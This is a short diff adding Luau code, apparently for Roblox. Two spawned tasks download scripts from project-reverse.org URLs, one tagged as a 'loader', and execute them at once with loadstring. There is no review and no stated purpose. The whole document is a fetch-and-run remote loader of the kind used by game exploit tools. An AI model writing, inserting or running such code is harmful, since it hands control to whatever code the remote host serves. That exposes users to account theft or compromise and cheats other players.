@@ -1,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_main.luau"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjRiMjg0ZGEzLTlmNjctNGRjZi1hYjcxLWY5YmY3ZDBmNTFiNyIsImtpbmQiOiJsb2FkZXIifQ")()
+end)
